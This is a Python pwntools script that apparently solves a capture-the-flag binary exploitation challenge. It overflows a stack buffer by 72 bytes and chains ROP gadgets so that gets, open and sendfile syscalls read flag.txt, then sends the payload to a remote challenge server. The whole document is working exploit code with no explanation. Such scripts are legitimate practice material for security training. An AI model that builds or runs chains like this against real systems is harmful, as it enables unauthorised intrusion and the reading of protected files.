from pwn import remote, p64

open_syscall = p64(0x40119f)
sendfile_syscall = p64(0x4011a9)
gets_plt = p64(0x401040)

pop_rdi = p64(0x401196)
pop_rsi = p64(0x401198)
pop_rdx = p64(0x40119a)
syscall = p64(0x4011a6)

pop_rbp = p64(0x40111d)
pop_r10 = p64(0x40119c)

bss_mem = p64(0x404020)

offset = 72
payload = b"A" * offset

payload += pop_rdi + bss_mem
payload += gets_plt

# open
payload += pop_rdi + bss_mem
payload += pop_rsi + p64(0)
payload += pop_rdx + p64(0)
payload += open_syscall


# sendfile
payload += pop_rdi + p64(1)
payload += pop_rsi + p64(3) # fd
payload += pop_rdx + p64(0)
payload += pop_r10 + p64(100)
payload += sendfile_syscall


p = remote("cyberchallenge.disi.unitn.it", 50330)
p.sendline(payload)
p.sendline(b'flag.txt\x00')
print(p.recvall().decode(errors="ignore"))

